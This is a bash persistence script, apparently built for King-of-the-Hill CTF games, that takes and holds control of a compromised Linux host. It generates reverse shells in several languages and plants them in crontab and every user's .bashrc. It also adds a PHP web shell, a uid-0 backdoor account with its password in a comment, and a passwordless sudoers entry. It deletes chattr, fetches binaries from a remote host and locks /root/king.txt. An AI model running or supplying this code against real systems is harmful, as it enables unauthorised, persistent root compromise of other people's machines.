SHELL=$(which bash)
#!$SHELL

if [[ $1 == "" || $2 == "" ]];then
        echo -e "\nsource $0 [IP] [PORT] [Reverse IP] [ Reverse Port ] [OPTIONS] [SHELL]

        Usage:\n\t\t[IP]/[PORT]: local server ip / local server port

        \t[Reverse IP]/[Reverse PORT]: IP that Receives the Reverse Shell / Port that Receives the Reverse Shell

        \t[OPTIONS]:

        \t\t [all] [-a] [a] [ALL]: persistence machine, king
        \t\t [nyancat] [-nc] [nc] [NYANCAT]: upload nyancat binary to machine
        \t\t [persist] [-p] [p] [PERSIST]: machine persistence

	\t[SHELL]:
	\t\t [python] [bash] [python3] [netcat] [nc] [socat] [zsh]
        
	\t[Examples]:

        \t\tsource $0 10.0.1.4 443 10.0.1.4 1337 all
        \t\tsource $0 10.0.1.4 6666 10.0.1.4 3333 persist
        \t\tsource $0 10.0.1.4 80
        \t\tsource $0 10.0.1.4 65521 10.0.1.4 7777 -nc python3
        \t\tsource $0 10.0.1.4 2121 10.0.1.4 5555
        \t\tsource $0 10.0.1.4 32323 10.0.1.4 1337 PERSIST netcat
	";exit 0
fi

# GLOBAL VARIABLES #

IP=$1
PORT=$2

REVIP=$3
REVPORT=$4

USERPORT="11111" # port for non-root shells

case $6 in
	python | PYTHON | Python)

		PERSIST="python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$REVIP\",$REVPORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"sh\")'"
		PERSIST_USER="python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$REVIP\",$USERPORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"sh\")'"

		;;
	bash | BASH | Bash)

		PERSIST="bash -i >& /dev/tcp/$REVIP/$REVPORT 0>&1 2>&1"
		PERSIST_USER="bash -i >& /dev/tcp/$REVIP/$USERPORT 0>&1 2>&1"

		;;

	python3 | PYTHON3 | Python3)

		PERSIST="python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$REVIP\",$REVPORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"sh\")'"
		PERSIST_USER="python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$REVIP\",$USERPORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"sh\")'"		

		;;

	netcat | NETCAT | Netcat)

		PERSIST="nc -e sh $REVIP $REVPORT"
		PERSIST_USER="nc -e sh $REVIP $USERPORT"

		;;

	nc | NC | Nc)

		PERSIST="rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc $REVIP $REVPORT >/tmp/f"
		PERSIST_USER="rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc $REVIP $USERPORT >/tmp/f"

		;;

	socat | SOCAT | Socat)

		PERSIST="socat TCP:$REVIP:$REVPORT EXEC:sh"
		PERSIST_USER="socat TCP:$REVIP:$USERPORT EXEC:sh"

		;;

	zsh | ZSH | Zsh)

		PERSIST="zsh -c 'zmodload zsh/net/tcp && ztcp $REVIP $REVPORT && zsh >&\$REPLY 2>&\$REPLY 0>&\$REPLY'"
		PERSIST_USER="zsh -c 'zmodload zsh/net/tcp && ztcp $REVIP $USERPORT && zsh >&\$REPLY 2>&\$REPLY 0>&\$REPLY'"

		;;

	*)

		noshell="1"

		;;

esac

ARGV5=$5
CHATTR_FILE="systtr"
NYANCAT_FILE="nyancat"
KING_USER="nwkz0"

export PATH="/usr/bin:/dev:/usr/sbin:/sbin:/bin:/usr/local/sbin:/usr/local/bin:$PATH"

# ///////////////////////////////////////////////////////////////////// #

rm -rf $(whereis chattr);
for ttr in $(find / -type f -name *chattr* 2>/dev/null);do rm -rf $ttr;done

NYANCAT()
{
	if [[ ! -f $NYANCAT_FILE && $(whereis $NYANCAT_FILE) ]];then

		wget "http://$IP:$PORT/$NYANCAT_FILE" 1>/dev/null 2>/dev/null

		chmod 700 $NYANCAT_FILE
		cp $NYANCAT_FILE /usr/bin/
	fi
}

PASSWDKING()
{
        if ! [[ $(cat /etc/passwd|grep "system:UlvN3HW/vZHjk:0:0::/root:/bin/bash") ]];then
                printf "\nsystem:UlvN3HW/vZHjk:0:0::/root:/bin/bash\n" >> /etc/passwd
                # // PASS: h4xx0r # //
        fi
}

MACHINE_PERSIST()
{
	echo -e "\n* * * * * root $PERSIST\n" >> /etc/crontab
	echo -e "\n$PERSIST\n" >> /root/.bashrc

	for homeuser in $(printf "\n%s" /home/*/|cut -d"/" -f3);do
		echo -e "\n$PERSIST_USER\n" >> /home/$homeuser/.bashrc
	done

	[[ ! -f /var/www/html/index.php ]] && touch /var/www/html/index.php

	printf "\n<?php system(\$_GET['xpl']);?>\n" >> /var/www/html/index.php

	PASSWDKING
	printf "\nsytem    ALL=(ALL:ALL)    NOPASSWD:    ALL\n" >> /etc/sudoers
}

KING_PERSIST()
{
	PASSWDKING

	if [[ ! -f $CHATTR_FILE ]];then
		wget http://$IP:$PORT/$CHATTR_FILE 1>/dev/null 2>/dev/null		
	fi

	chmod 700 $CHATTR_FILE

	if [[ $(cat /root/king.txt) != $KING_USER ]];then
		./$CHATTR_FILE -ia /root/king.txt
		printf "%s" $KING_USER > /root/king.txt
	fi
	./$CHATTR_FILE +ia /root/king.txt
}

MAIN()
{
	case $ARGV5 in
		all | -a | a | ALL) MACHINE_PERSIST; SSH_PERSIST
			while true;do
				KING_PERSIST
				sleep 0.01
			done
			;;

		persist | -p | p | PERSIST) MACHINE_PERSIST;;

		nyancat | -nc | nc | NYANCAT) NYANCAT;;

		*)
                        while true;do
                                KING_PERSIST
				sleep 0.01
                        done
                        ;;
	esac
}

MAIN
